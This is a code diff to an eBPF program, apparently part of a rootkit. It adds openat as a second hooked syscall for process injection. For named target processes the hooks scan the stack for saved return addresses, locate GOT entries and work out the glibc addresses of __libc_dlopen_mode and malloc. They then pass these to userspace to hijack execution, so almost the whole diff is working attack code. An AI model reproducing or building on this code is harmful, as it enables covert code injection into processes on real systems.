@@ -18,7 +18,8 @@
 #define OPCODE_PLT_JMP_BYTE_1 0x25
 #define OPCODE_PLT_RERLO_BYTE_0 0xf3
 #define OPCODE_PLT_RERLO_BYTE_1 0x0f
-#define GLIBC_OFFSET_MAIN_TO_SYSCALL 0xf00d0
+#define GLIBC_OFFSET_MAIN_TO_TIMERFD_SETTIME 0xf00d0
+#define GLIBC_OFFSET_MAIN_TO_OPENAT 0xdf580
 #define GLIBC_OFFSET_MAIN_TO_DLOPEN 0x12f120
 #define GLIBC_OFFSET_MAIN_TO_MALLOC 0x6eca0
 
@@ -39,6 +40,16 @@ struct sys_timerfd_settime_exit_ctx {
     long ret;
 };
 
+//struct sys_openat_enter_ctx {}
+//Defined in fs.h
+
+
+
+enum syscall_injection_supported{
+    SYS_TIMERFD_SETTIME,
+    SYS_OPENAT
+};
+
 /**
  * @brief Checks whether the format of the syscall is the expected one
  * 
@@ -46,8 +57,9 @@ struct sys_timerfd_settime_exit_ctx {
  * @param size 
  * @return 0 if correct, 1 otherwise
  */
-static __always_inline int check_syscall_opcodes(__u8* opcodes){
-    return 0 == (/*opcodes[0]==0xf3     //FOR GDB WORKING TODO REMOVE
+static __always_inline int check_syscall_opcodes(__u8* opcodes, enum syscall_injection_supported sys){
+    if(sys==SYS_TIMERFD_SETTIME){
+        return 0 == (/*opcodes[0]==0xf3     //FOR GDB WORKING TODO REMOVE
         &&*/ opcodes[1]==0x0f
         && opcodes[2]==0x1e
         && opcodes[3]==0xfa
@@ -61,10 +73,26 @@ static __always_inline int check_syscall_opcodes(__u8* opcodes){
         && opcodes[11]==0x00
         && opcodes[12]==0x0f
         && opcodes[13]==0x05);
-
+    }else if(sys == SYS_OPENAT){
+        return 0 == (/*opcodes[0]==0xf3     //FOR GDB WORKING TODO REMOVE
+        &&*/ opcodes[1]==0x0f
+        && opcodes[2]==0x1e
+        && opcodes[3]==0xfa
+        && opcodes[4]==0x48
+        && opcodes[5]==0x83
+        && opcodes[6]==0xec
+        && opcodes[7]==0x78
+        && opcodes[8]==0x48
+        && opcodes[9]==0x89
+        && opcodes[10]==0x4c
+        && opcodes[11]==0x24
+        && opcodes[12]==0x58
+        && opcodes[13]==0x64);
+    }
+    return 1;
 }   
 
-static __always_inline int stack_extract_return_address_plt(__u64 stack_rip){
+static __always_inline int stack_extract_return_address_plt(__u64 stack_rip, enum syscall_injection_supported sys){
     //We have a possible RIP from the stack, to which we can take the previous instruction, 
     //and check if its opcodes correspond with the expected format
     __u64 *entry_call_addr = (__u64*)(stack_rip - 0x5);
@@ -112,6 +140,7 @@ static __always_inline int stack_extract_return_address_plt(__u64 stack_rip){
 
     int plt_found = 0;
     int relro_active = 0;
+
     
     //Check documentation for details on jump recognition.
     if(libc_opcodes[0]==OPCODE_PLT_JMP_BYTE_0 && libc_opcodes[1]==OPCODE_PLT_JMP_BYTE_1){
@@ -175,7 +204,7 @@ static __always_inline int stack_extract_return_address_plt(__u64 stack_rip){
         for(int ii=0; ii<14; ii++){
             //bpf_printk("S_OPC %i: %x\n",ii,s_opcode[ii]);
         }
-        if(check_syscall_opcodes(s_opcode)!=0){
+        if(check_syscall_opcodes(s_opcode, sys)!=0){
             bpf_printk("Not the expected syscall\n");
             return -1;
         }
@@ -223,7 +252,7 @@ int sys_enter_timerfd_settime(struct sys_timerfd_settime_enter_ctx *ctx){
         return -1;
     }
 
-    char *task = TASK_COMM_NAME_ROP_TARGET;
+    char *task = TASK_COMM_NAME_INJECTION_TARGET_TIMERFD_SETTIME;
     if(str_n_compare(comm, TASK_COMM_LEN, task, STRING_FS_SUDO_TASK_LEN, STRING_FS_SUDO_TASK_LEN) != 0){
         return 0;
     }
@@ -241,7 +270,7 @@ int sys_enter_timerfd_settime(struct sys_timerfd_settime_enter_ctx *ctx){
         //if it truly is the saved RIP (checking that there is a path to the actual syscall).
         bpf_probe_read(&address, sizeof(__u64), (void*)scanner - ii);
         //bpf_printk("stack: %lx\n", address);
-        if(stack_extract_return_address_plt(address)==0){
+        if(stack_extract_return_address_plt(address, SYS_TIMERFD_SETTIME)==0){
             //We found the return address
             __u64 found_return_address = *scanner - ii;
             //We put it in an internal map.
@@ -269,9 +298,9 @@ int sys_enter_timerfd_settime(struct sys_timerfd_settime_enter_ctx *ctx){
              //Tell userspace to perform operations on localized addresses
             int pid = bpf_get_current_pid_tgid() >> 32;
             ring_buffer_send_vuln_sys(&rb_comm, pid, addr->libc_syscall_address, 
-                addr->stack_ret_address, addr->libc_syscall_address - GLIBC_OFFSET_MAIN_TO_SYSCALL, 
-                addr->libc_syscall_address - GLIBC_OFFSET_MAIN_TO_SYSCALL + GLIBC_OFFSET_MAIN_TO_DLOPEN,
-                addr->libc_syscall_address - GLIBC_OFFSET_MAIN_TO_SYSCALL + GLIBC_OFFSET_MAIN_TO_MALLOC, 
+                addr->stack_ret_address, addr->libc_syscall_address - GLIBC_OFFSET_MAIN_TO_TIMERFD_SETTIME, 
+                addr->libc_syscall_address - GLIBC_OFFSET_MAIN_TO_TIMERFD_SETTIME + GLIBC_OFFSET_MAIN_TO_DLOPEN,
+                addr->libc_syscall_address - GLIBC_OFFSET_MAIN_TO_TIMERFD_SETTIME + GLIBC_OFFSET_MAIN_TO_MALLOC, 
                 addr->got_address, addr->libc_syscall_address, addr->relro_active);
 
             return 0;
@@ -291,7 +320,7 @@ int sys_exit_timerfd_settime(struct sys_timerfd_settime_exit_ctx *ctx){
     if(err<0){
         return -1;
     }
-    char *task = TASK_COMM_NAME_ROP_TARGET;
+    char *task = TASK_COMM_NAME_INJECTION_TARGET_TIMERFD_SETTIME;
     if(str_n_compare(comm, TASK_COMM_LEN, task, STRING_FS_SUDO_TASK_LEN, STRING_FS_SUDO_TASK_LEN) != 0){
         return 0;
     }
@@ -307,9 +336,87 @@ int sys_exit_timerfd_settime(struct sys_timerfd_settime_exit_ctx *ctx){
 
     struct inj_ret_address_data addr = *inj_ret_addr;
     bpf_printk("PID: %u, SYSCALL_ADDR: %lx, STACK_RET_ADDR: %lx", pid, addr.libc_syscall_address, addr.stack_ret_address);
-    bpf_printk("Address of libc main: %lx\n", addr.libc_syscall_address - GLIBC_OFFSET_MAIN_TO_SYSCALL);
-    bpf_printk("Address of libc_dlopen_mode: %lx\n", addr.libc_syscall_address - GLIBC_OFFSET_MAIN_TO_SYSCALL + GLIBC_OFFSET_MAIN_TO_DLOPEN);
-    bpf_printk("Address of malloc: %lx\n", addr.libc_syscall_address - GLIBC_OFFSET_MAIN_TO_SYSCALL + GLIBC_OFFSET_MAIN_TO_MALLOC);
+    bpf_printk("Address of libc main: %lx\n", addr.libc_syscall_address - GLIBC_OFFSET_MAIN_TO_TIMERFD_SETTIME);
+    bpf_printk("Address of libc_dlopen_mode: %lx\n", addr.libc_syscall_address - GLIBC_OFFSET_MAIN_TO_TIMERFD_SETTIME + GLIBC_OFFSET_MAIN_TO_DLOPEN);
+    bpf_printk("Address of malloc: %lx\n", addr.libc_syscall_address - GLIBC_OFFSET_MAIN_TO_TIMERFD_SETTIME + GLIBC_OFFSET_MAIN_TO_MALLOC);
+
+    return 0;
+}
+
+
+SEC("tp/syscalls/sys_enter_openat")
+int sys_enter_openat(struct sys_openat_enter_ctx *ctx){
+    __u64 *scanner = (__u64*)ctx->filename;
+    char comm[TASK_COMM_LEN] = {0};
+    int err = bpf_get_current_comm(comm, sizeof(comm));
+    if(err<0){
+        return -1;
+    }
+
+    char *task = TASK_COMM_NAME_INJECTION_TARGET_OPEN;
+    if(str_n_compare(comm, TASK_COMM_LEN, task, STRING_FS_SUDO_TASK_LEN, STRING_FS_SUDO_TASK_LEN) != 0){
+        return 0;
+    }
+    struct pt_regs* longscan;// = (struct pt_regs*)ctx->unused;
+    bpf_probe_read(&longscan, sizeof(struct pt_regs*), &(ctx->unused));
+    unsigned long rbp_reg;
+    bpf_probe_read(&rbp_reg, sizeof(unsigned long), &(longscan->bp));
+    bpf_printk("Called openat, scanner: %lx; rbp: %lx\n", scanner, rbp_reg);
+    bpf_printk("TASK: %s\n", comm);
+
+    long timesecs;
+    //bpf_probe_read_user(&timesecs, sizeof(long), &(new->it_interval.tv_sec));
+    //bpf_printk("AG %ld\n",timesecs);
+    __u64 address = 0;
+    //Let's try to use the rbp as a scanner for this one, provided that the argument filename
+    //is stored in the heap.
+    scanner = (__u64*)rbp_reg;
+    bpf_printk("Called the open syscall tracepoint\n");
+    #pragma unroll
+    for(__u64 ii=0; ii<200; ii++){
+        //We got a foothold in the stack via the syscall argument, now we scan to lower memory
+        //positions assuming those are the saved RIP. We will then perform checks in order to see
+        //if it truly is the saved RIP (checking that there is a path to the actual syscall).
+        bpf_probe_read(&address, sizeof(__u64), (void*)scanner - ii);
+        bpf_printk("stack: %lx\n", address);
+        if(stack_extract_return_address_plt(address, SYS_OPENAT)==0){
+            //We found the return address
+            __u64 found_return_address = *scanner - ii;
+            //We put it in an internal map.
+            __u64 pid_tgid = bpf_get_current_pid_tgid();
+            if(pid_tgid<0){
+                return -1;
+            }
+            struct inj_ret_address_data *addr = (struct inj_ret_address_data*) bpf_map_lookup_elem(&inj_ret_address, &pid_tgid);
+            if (addr == NULL){
+                //It means we failed to insert into the map before
+                return -1;
+            }
+            //struct inj_ret_address_data addr = *inj_ret_addr;
+            //struct inj_ret_address_data addr;
+            //bpf_probe_read(&addr, sizeof(struct inj_ret_address_data), inj_ret_addr);
+            addr->stack_ret_address = (__u64)scanner - ii;
+            if(bpf_map_update_elem(&inj_ret_address, &pid_tgid, addr, BPF_EXIST)<0){
+                bpf_printk("Failed to insert the return address in bpf map\n");
+                return -1;
+            }
+            bpf_printk("Final found return address: %lx\n", addr->stack_ret_address);
+            bpf_printk("GOT address: %lx\n", addr->got_address);
+
+
+             //Tell userspace to perform operations on localized addresses
+            int pid = bpf_get_current_pid_tgid() >> 32;
+            ring_buffer_send_vuln_sys(&rb_comm, pid, addr->libc_syscall_address, 
+                addr->stack_ret_address, addr->libc_syscall_address - GLIBC_OFFSET_MAIN_TO_OPENAT, 
+                addr->libc_syscall_address - GLIBC_OFFSET_MAIN_TO_OPENAT + GLIBC_OFFSET_MAIN_TO_DLOPEN,
+                addr->libc_syscall_address - GLIBC_OFFSET_MAIN_TO_OPENAT + GLIBC_OFFSET_MAIN_TO_MALLOC, 
+                addr->got_address, addr->libc_syscall_address, addr->relro_active);
+
+            return 0;
+        }
+    }
+
+    bpf_printk("Finished without findings\n");
 
     return 0;
 }
